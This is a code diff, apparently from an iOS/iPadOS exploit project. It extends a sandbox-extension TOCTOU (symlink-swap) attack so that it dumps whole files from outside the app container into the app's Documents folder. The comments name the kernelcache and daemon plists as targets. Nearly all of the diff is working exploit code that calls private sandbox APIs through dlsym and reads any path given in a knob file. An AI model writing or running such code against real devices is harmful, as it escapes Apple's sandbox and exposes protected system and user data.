@@ -41,7 +41,7 @@
 #import <stdio.h>
 #import <string.h>
 
-#define P116_BUILD @"p116-sandboxext-toctou-v2-path-dir-rw"
+#define P116_BUILD @"p116-sandboxext-toctou-v3-dump"
 
 static NSMutableString *g_log = nil;
 static int g_fd = -1;
@@ -168,6 +168,62 @@ static long p116_write_test(const char *outPath, const char *s, const char *l) {
     return wrote;
 }
 
+/* v3: full-file dump through the same TOCTOU. The v2 p116_read is capped at
+   64 KB (bounded receipt row); the dump reads the target in 1 MB chunks and
+   writes the bytes to Documents/p116_live_<basename> (cap 256 MB). This is
+   the out-of-container read that can carry a large artifact (kernelcache,
+   daemon plists) out on iPadOS 26.7.1. Read-only; tokens never logged. */
+static long long p116_dump(const char *outPath, const char *s, const char *l, NSString *docs) {
+    unlink(l);
+    if (symlink(s, l) != 0) return -1;
+    char *tok = g_issue("com.apple.app-sandbox.read", l, 0);
+    if (!tok) return -1;
+    unlink(l);
+    if (symlink(outPath, l) != 0) {
+        memset(tok, 0, strlen(tok)); free(tok); return -1;
+    }
+    int64_t h = g_consume(tok);
+    memset(tok, 0, strlen(tok));
+    free(tok);
+    if (h <= 0) return -1;
+    long long total = 0;
+    int fd = open(l, O_RDONLY);
+    if (fd >= 0) {
+        NSString *base = [NSString stringWithUTF8String:outPath].lastPathComponent;
+        NSString *outf = [docs stringByAppendingPathComponent:
+            [@"p116_live_" stringByAppendingString:base]];
+        int ofd = open(outf.UTF8String, O_CREAT | O_WRONLY | O_TRUNC, 0644);
+        if (ofd >= 0) {
+            static char buf[1 << 20];
+            long long lastReport = 0;
+            ssize_t r;
+            while ((r = read(fd, buf, sizeof buf)) > 0) {
+                ssize_t off = 0;
+                while (off < r) {
+                    ssize_t w = write(ofd, buf + off, (size_t)(r - off));
+                    if (w <= 0) break;
+                    off += w;
+                }
+                total += r;
+                if (total > (256LL << 20)) break;   /* bounded dump */
+                if (total - lastReport >= (8LL << 20)) {
+                    Lf(@"    dump … %lld bytes", total);
+                    lastReport = total;
+                }
+            }
+            (void)fcntl(ofd, F_FULLFSYNC);
+            close(ofd);
+            Lf(@"[v3] dump wrote Documents/p116_live_%@", base);
+        } else {
+            L(@"[-] dump local open failed (Documents not writable?)");
+            total = -2;
+        }
+        close(fd);
+    }
+    if (g_release) g_release(h);
+    return total;
+}
+
 @implementation P116SandboxExtTocTou
 
 + (NSString *)tap {
@@ -193,6 +249,8 @@ static long p116_write_test(const char *outPath, const char *s, const char *l) {
     L(@"  KERNEL / Full Chain do not auto-fire this as a privilege step.");
     L(@"[v2] knobs: Documents/p116_path.txt (single read), p116_dir.txt (list),");
     L(@"  p116_rw_path.txt (read-write probe; /var/mobile only). Tokens never logged.");
+    L(@"[v3] dump knob: p116_dump_path.txt — full-file out-of-container read into");
+    L(@"  Documents/p116_live_<basename> (1 MB chunks, 256 MB cap, read-only).");
 
     g_issue   = (p116_issue_t)dlsym(RTLD_DEFAULT, "sandbox_extension_issue_file");
     g_consume = (p116_consume_t)dlsym(RTLD_DEFAULT, "sandbox_extension_consume");
@@ -252,6 +310,23 @@ static long p116_write_test(const char *outPath, const char *s, const char *l) {
                 if (w > 0) {
                     long rb = p116_read(rw.UTF8String, s, l, NULL);
                     Lf(@"[v2] rw readback %ld bytes", rb);
+                }
+            }
+
+            /* v3: full-file dump knob (the dump read is full-length, not the
+               64 KB receipt cap). Target unrestricted — the receipt decides. */
+            NSString *dp = [[NSString stringWithContentsOfFile:
+                [docs stringByAppendingPathComponent:@"p116_dump_path.txt"]
+                encoding:NSUTF8StringEncoding error:nil]
+                stringByTrimmingCharactersInSet:[NSCharacterSet whitespaceAndNewlineCharacterSet]];
+            if (!dp.length) {
+                L(@"[v3] dump skipped (create Documents/p116_dump_path.txt to enable)");
+            } else {
+                long long d = p116_dump(dp.UTF8String, s, l, docs);
+                if (d >= 0) {
+                    Lf(@"[v3] dump %@ — %lld bytes (read-only; no kernel claim)", dp, d);
+                } else {
+                    Lf(@"[v3] dump %@ — refused/failed (%lld; honest miss)", dp, d);
                 }
             }
         }
